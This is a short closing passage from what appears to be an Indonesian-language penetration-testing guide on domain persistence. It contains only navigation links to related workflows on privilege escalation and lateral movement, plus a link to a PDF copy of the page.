> **➡️ NEXT:** Setelah domain persistence berhasil, lanjut ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)** atau **[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)** untuk host-level escalation, atau ke **[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)** untuk memperluas akses ke network segments lain.

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789141966876-43_domain_persistence_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260911%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260911T155248Z&X-Amz-Expires=3600&X-Amz-Signature=c77224fcd028600b308e2d12589c1b932d4faa09449cce856e11ef6295022c3d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)